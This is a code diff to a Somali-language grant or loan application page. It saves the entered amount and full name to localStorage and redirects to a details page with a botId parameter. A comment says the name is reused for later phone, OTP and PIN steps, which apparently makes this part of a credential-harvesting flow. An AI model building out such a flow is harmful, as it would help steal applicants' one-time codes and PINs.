@@ -226,7 +226,7 @@
         </select>
 
         <label>Qadarka deeqda (USD)</label>
-        <input type="number" name="loanAmount" required placeholder="Ugu yar $100" min="100" max="100000" step="1" />
+        <input type="number" name="loanAmount" id="loanAmountInput" required placeholder="Ugu yar $100" min="100" max="100000" step="1" />
 
         <label>Muddada deeqda</label>
         <select name="loanTerm" required>
@@ -321,6 +321,11 @@
 
             // Save the full name (used later in phone/OTP/PIN)
             localStorage.setItem('fullName', data.fullName);
+
+            // ✅ FIX: Save the actual loan amount entered by the user
+            // This overwrites the default $100 from the calculator
+            const loanAmount = data.loanAmount || '0';
+            localStorage.setItem('loanAmount', loanAmount);
 
             // Redirect to phone verification
             window.location.href = `details.html?botId=${botId}`;
